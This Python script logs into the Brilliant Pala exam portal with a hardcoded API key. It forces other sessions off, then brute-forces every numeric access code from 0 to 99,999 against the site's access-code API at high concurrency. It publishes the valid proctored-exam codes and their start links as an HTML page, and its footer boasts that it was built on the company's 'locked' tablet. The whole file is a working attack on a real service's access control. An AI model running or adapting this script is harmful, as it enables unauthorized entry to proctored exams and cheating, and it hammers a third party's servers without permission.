import sys
import aiohttp
import asyncio
import traceback
import datetime
from bs4 import BeautifulSoup as bs
import os

BASE_URL = "https://classes.brilliantpala.org/"

HEADERS = {
    "User-Agent": f"Mozilla/5.0 (Linux; Android 11; Tab 11 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Safari/537.36",
    "Referer": BASE_URL,
    "X-Key": "d77fe6ed65feef09aeb8cd2d7d8a8044e9f1a79ed102f41e487f49e3713b43d2",
}

try:
    os.mkdir("build")
except FileExistsError:
    pass
os.chdir("./build")
results = []
count = 0

async def login(username, password):
    async with aiohttp.ClientSession() as session:
        async with session.get(BASE_URL) as res:
            content = await res.text()
            bs_content = bs(content, "html.parser")
            csrf = bs_content.find("input", {"name": "csrfmiddlewaretoken"})["value"]

        data = {
            "csrfmiddlewaretoken": csrf,
            "username": str(username),
            "password": str(password),
        }

        async with session.post(
            BASE_URL + "login/?next=",
            data=data,
            headers={"Referer": BASE_URL, "Cookie": "csrftoken=" + csrf},
            allow_redirects=False,
        ) as res:
            if res.status == 302:
                cookies = res.cookies
                HEADERS["Cookie"] = (
                    "sessionid="
                    + cookies["sessionid"].value
                    + "; csrftoken="
                    + cookies["csrftoken"].value
                )

                async with session.get(
                    BASE_URL + "logout_devices/?next=/",
                    headers=HEADERS,
                ) as res:
                    content = await res.text()
                    bs_content = bs(content, "html.parser")
                    csrf = bs_content.find("input", {"name": "csrfmiddlewaretoken"})["value"]

                async with session.post(
                    BASE_URL + "logout_devices/?next=/",
                    data={"csrfmiddlewaretoken": csrf},
                    headers=HEADERS,
                ) as res:
                    pass

                print("Logged in.")
                
                # Create a semaphore to limit concurrent requests
                sem = asyncio.Semaphore(100)  # Limit to 20 concurrent requests
                
                # Create tasks for all codes
                tasks = []
                for i in range(0, 100000):
                    tasks.append(asyncio.create_task(fetch_code(i, session, sem)))
                
                # Wait for all tasks to complete
                await asyncio.gather(*tasks)
                
                # Generate HTML
                f = open("index.html", "w+")
                formatted = "\n".join(
                    [
                        f"""<tr>
                          <td>{code}</td>
                          <td><a href='{BASE_URL}exams/run/{slug}/start/'>{title}</a></td>
                        </tr>"""
                        for code, title, _, slug in sorted(
                            results, key=lambda x: x[2], reverse=True
                        )
                    ]
                )
                f.write(
                    f"""
<html>
  <head>
    <title>Brilliant Proctored Access Codes</title>
    <style>
      body {{
          background-color: #f0f5ff; /* Light blue background */
          color: #333; /* Dark text color */
          font-family: Arial, sans-serif;
        }}

      h1 {{
        color: #0077cc; /* Blue heading color */
      }}

      table {{
        border: 2px solid #0077cc; /* Blue border for the table */
        width: 80%;
        margin: 20px auto;
        border-collapse: collapse;
      }}

      th, td {{
        border: 1px solid #0077cc; /* Blue border for table cells */
        padding: 10px;
      }}

      hr {{
        border: 1px solid #0077cc; /* Blue border for the horizontal rule */
      }}

      footer {{
        margin-top: 20px;
        text-align: center;
        color: #666; /* Gray text color for the footer */
        font-style: italic;
      }}
    </style>
  </head>
  <body align="center">
    <h1>Brilliant Proctored Exam Access Codes</h1>
    These are all valid access codes to exams which may or may not have started or ended on classes.brilliantpala.org.
    <hr>
    <table>
      <tr>
        <th>Code</th>
        <th>Exam</th>
      </tr>
      {formatted}
    </table>
    <hr>
    <footer>
    Made by <a href="https://github.com/Alpha62579/">Robin.</a> on Brilliant's "locked" study tablet.
    </footer>
  </body>
</html>"""
                )
                f.close()
                
                async with session.get(
                    BASE_URL + "logout",
                    headers=HEADERS,
                ) as res:
                    pass
                    
                print("Process complete with", count, "codes found.")
                return

async def fetch_code(k, session, sem):
    global count
    async with sem:  # This ensures we don't exceed the concurrent request limit
        try:
            async with session.get(
                BASE_URL + f"api/v2.3/access_codes/{k}/exams/",
                headers=HEADERS,
            ) as res:
                if res.status == 200:
                    result = (await res.json())["results"][0]
                    results.append(
                        (
                            k,
                            result["title"],
                            (
                                datetime.datetime.fromisoformat(result["end_date"])
                                if isinstance(result["end_date"], str)
                                else datetime.datetime.fromisoformat(result["start_date"])
                            ),
                            result["slug"],
                        )
                    )
                    count += 1
                    print(k, "yay code")
        except Exception:
            print(traceback.format_exc())

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python access_html.py <username> <password>")
        sys.exit(1)
    asyncio.run(login(sys.argv[1], sys.argv[2]))
